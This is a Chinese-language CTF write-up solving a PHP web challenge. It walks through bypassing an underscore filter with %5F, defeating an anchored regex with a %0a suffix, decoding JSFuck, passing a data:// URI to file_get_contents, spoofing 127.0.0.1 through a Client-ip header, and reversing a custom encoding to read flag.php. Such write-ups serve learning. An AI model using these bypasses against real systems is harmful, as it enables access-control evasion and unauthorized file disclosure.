主页面只有一张加载不出来的图片，查看源码，有注释如下：

```php
<!--
//1st
$query = $_SERVER['QUERY_STRING'];

 if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){
    die('Y0u are So cutE!');
}
 if($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t'])){
    echo "you are going to the next ~";
}
!-->
```

要求GET提交一个名为`b_u_p_t`的参数，它要能满足`/^23333$/`的正则，并且不是字符串`23333`。其次`_`和它的url编码`%5f`要求出现0次，但是要求提交的参数名却有下划线。

对于第一个要求，因为是/^...$/形式的正则，我们在23333结尾加上一个%0a,这样正则匹配的时候，$默认匹配最后一个%0a之前的字符。

对于第二个要求，我们可以用%5F。这里用`$_SERVER['QUERY_STRING']`获取字符串是怕自动url解码，`%5F`也会被解码成`_`

因此传入`?b%5Fu%5Fp%5Ft=23333%0a`

提示flag在secrettw.php中,访问后如下：

```html
Flag is here~But how to get it?Local access only!<br/>Sorry,you don't have permission!  Your ip is :sorry,this way is banned! 
```

同时html注释中有一段仅由`[]()+!`组成的字符串，可以确定是jsfuck编码。找个网站解码，内容是`alert("post me Merak")`

POST提交Merak，值随便，然后页面给出源码:

```php
<?php 
error_reporting(0); 
include 'takeip.php';
ini_set('open_basedir','.'); 
include 'flag.php';

if(isset($_POST['Merak'])){ 
    highlight_file(__FILE__); 
    die(); 
} 
function change($v){ 
    $v = base64_decode($v); 
    $re = ''; 
    for($i=0;$i<strlen($v);$i++){ 
        $re .= chr ( ord ($v[$i]) + $i*2 ); 
    } 
    return $re; 
}
echo 'Local access only!'."<br/>";
$ip = getIp();
if($ip!='127.0.0.1')
echo "Sorry,you don't have permission!  Your ip is :".$ip;
if($ip === '127.0.0.1' && file_get_contents($_GET['2333']) === 'todat is a happy day' ){
echo "Your REQUEST is:".change($_GET['file']);
echo file_get_contents(change($_GET['file'])); }
?> 
```

flag就在flag.php中，我们首先满足`getIp() === '127.0.0.1'`，然后满足`file_get_contents($_GET['2333']) === 'todat is a happy day'`最后读取的文件是`file_get_contents(change($_GET['file']))`。

从目标倒退，利用`file_get_contents`读flag.php。那么`change($_GET['file']))`就要是`flag.php`我们自然要对payload进行一个change的逆变换。

```php
<?php
function change($v){ 
    $v = base64_decode($v); 
    $re = ''; 
    for($i=0;$i<strlen($v);$i++){ 
        $re .= chr ( ord ($v[$i]) + $i*2 ); 
    } 
    return $re; 
}
function change_reverse($v): string{
    $re = ''; 
    for($i=0;$i<strlen($v);$i++){ 
        $re .= chr ( ord ($v[$i]) - $i*2 ); 
    } 
    $re = base64_encode($re); 
    return $re; 
}
$v = 'flag.php';     #这里一开始是用的php://filter发现读不了，就直接flag.php好了
$x = change_reverse($v);
print($x);
print("<br>");
print(change($x));
```

最后成功打印了原字符串。

然后是`file_get_contents($_GET['2333']) === 'todat is a happy day'`。`file_get_contents`的参数本来是要读的文件路径，这里有两种方法直接传入目标字符串：

1. 使用data://协议
2. 使用php://input，数据部分写入字符串

我们使用方法1，传入`?2333=data://text/plain,todat is a happy day`。

最后是`getIp() === '127.0.0.1'`因为这里getIp是定义在takeip.php中，我们不知道是怎么获取的，x-forwarded-for,x-real-ip

Client-ip都试试。最后发现是Client-ip

![image-20250912132520817](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250912132520817.png)
